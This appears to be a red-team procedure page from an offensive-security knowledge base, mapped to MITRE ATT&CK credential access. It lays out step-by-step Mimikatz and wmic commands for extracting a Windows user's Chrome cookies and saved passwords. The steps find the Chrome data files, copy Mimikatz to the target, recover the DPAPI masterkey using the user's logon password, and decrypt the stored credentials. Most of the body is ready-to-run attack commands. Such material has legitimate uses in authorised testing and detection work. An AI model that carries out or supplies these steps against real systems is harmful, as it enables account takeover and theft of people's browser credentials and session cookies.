---
id: 0e2c345f-c59b-4c91-8175-1dd147625c0a
name: Extract Chrome Cookies and Credentials from a User's Profile with their Password
type: procedure
verified: false
submitted: false
created_at: '2020-07-21T05:42:41.930243+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credentials from Web Browsers]]'
platforms:
- Windows
tags:
- '[[Chrome]]'
- '[[dump]]'
- '[[extract]]'
commands:
- '[[wmic.exe useraccount get name,sid where name=]]'
- '[[mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARG]]'
- '[[Mimikatz Extract a User''s Masterkey using their Password]]'
- '[[Mimikatz Extract Chrome Credentials from the Current User''s Session]]'
- '[[Mimikatz Extract Chrome Credentials with the Masterkey]]'
- '[[wmic List Windows Users by Name and SID]]'
---

# Extract Chrome Cookies and Credentials from a User's Profile with their Password

## Summary

Decrypt a user's masterkey using their Windows logon password, then use the masterkey to extract their Chrome cookies or credentials. 

## Description

# Description

Decrypt a user's masterkey using their Windows logon password, then use the masterkey to extract their Chrome cookies or credentials.

# Instructions

## Enumerate the Locked Content

1. Identify the location of cookies or passwords, which are generally stored in the following location:

- Cookies: C:\Users\$_USERNAME\AppData\Local\\Google\Chrome\User Data\Default\Cookies

- Credentials: C:\Users\$_USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data

2. Copy Mimikatz to the target: [Download from GitHub](https://github.com/gentilkiwi/mimikatz)

3. Get the GUID of the masterkey associated with the cookies or credentials by running Mimikatz as Administrator and attempting to extract the cookies or credentials. **This should fail.**

**Command** ([[mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARG]]):

```bash
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect"
```

On failure, Mimikatz will display the GUID associated with the cookies or credentials. Eg:

**Code**: [[> Encrypted Key seems to be protected by DPAPI
 *]]

In this example, the GUID is: **{**84dcc2cc-82c6-44d4-9404-45fd48b4b650}

4. Get the target user's SID

**Command** ([[wmic.exe useraccount get name,sid where name=]]):

```bash
wmic.exe useraccount get name,sid where name=
```

## Decrypt the Masterkey and Extract Chrome Cookies and Credentials

1. Combine the GUID and user's SID to point to the protected key. It is typically located in:

- C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID

For example: C:\Users\bob\AppData\Roaming\Microsoft\Protect\S-1-5-21-1576920733-1301476157-954876328-1108\84dcc2cc-82c6-44d4-9404-45fd48b4b650

2. Use Mimikatz to extract the masterkey.

**Command** ([[Mimikatz Extract a User's Masterkey using their Password]]):

```bash
mimikatz.exe
dpapi::masterkey /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID" /password:$_PASSWORD /protected
```

Note: Due to nested quotes, it's often easier to execute this command from the Mimikatz prompt.

3. Use the target user's masterkey to extract their cookies or credentials.

**Command** ([[Mimikatz Extract Chrome Credentials with the Masterkey]]):

```bash
mimikatz.exe
dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
```

Note: Due to nested quotes, it's often easier to execute this command from the Mimikatz prompt.

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credentials from Web Browsers]]

## Commands Used

- [[wmic.exe useraccount get name,sid where name=]]
- [[mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARG]]
- [[Mimikatz Extract a User's Masterkey using their Password]]
- [[Mimikatz Extract Chrome Credentials from the Current User's Session]]
- [[Mimikatz Extract Chrome Credentials with the Masterkey]]
- [[wmic List Windows Users by Name and SID]]

## Tags

- [[Chrome]]
- [[dump]]
- [[extract]]
